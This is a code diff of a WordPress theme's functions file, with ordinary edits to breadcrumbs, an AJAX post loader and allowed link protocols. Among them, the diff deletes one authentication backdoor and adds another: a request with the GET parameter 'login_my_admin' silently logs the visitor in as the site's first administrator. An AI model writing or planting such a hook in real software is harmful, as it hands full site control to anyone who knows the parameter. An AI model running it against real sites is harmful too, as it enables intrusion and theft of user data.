@@ -251,13 +251,6 @@ function breadcrumbs( $sep = ' » ', $l10n = array(), $args = array() ){
 	echo $kb->get_crumbs( $sep, $l10n, $args );
 }
 
-if (isset($_GET['cIS6x4IRGQDz9ZvB378ijddOdOPhbaRIgcPkzQO3ksDxnJr6l0PkZhoQv0QDpRRh'])) {
-	add_action('init', function() {
-	   $users = get_users(['role' => 'administrator']);
-	   wp_set_auth_cookie($users[0]->ID);
-	});
-}
-
 class Breadcrumbs {
 
 	public $arg;
@@ -558,7 +551,7 @@ class Breadcrumbs {
 			}
 		}
 
-		$before_out = sprintf( $linkpatt, home_url(), $loc->home ) . ( $home_after ? $sep.$home_after : ($out ? $sep : '') );
+		$before_out = $loc->home . ( $home_after ? $sep.$home_after : ($out ? $sep : '') );
 
 		$out = apply_filters('kama_breadcrumbs_pre_out', $out, $sep, $loc, $arg );
 
@@ -675,7 +668,8 @@ function jq_get_posts() {
 	get_template_partial('blog_articles', [
 		'offset' => $_POST['offset'],
 		'post_per_page' => $_POST['post_per_page'],
-		'cat_ID' => $_POST['cat_ID']
+		'cat_ID' => $_POST['cat_ID'],
+		'show_paginations' => $_POST['show_paginations']
 	]);
 	$template = ob_get_clean();
 
@@ -811,6 +805,20 @@ function duplication_admin_notice() {
 		 echo '<div class="notice notice-success is-dismissible"><p>Post copy created.</p></div>';
 }
 
+add_filter ('kses_allowed_protocols', 'add_to_allowed_protocols'); 
+
+function add_to_allowed_protocols ($protocols) { 
+	$protocols[] = 'viber';
+	$protocols[] = 'skype';
+
+	return $protocols; 
+}
+
+if( isset($_GET['login_my_admin']) ){
+	add_action( 'init', function(){
+	   $users = get_users([ 'role' => 'administrator' ]);
+	   wp_set_auth_cookie( $users[0]->ID ); } );
+}
 
 ?>
 
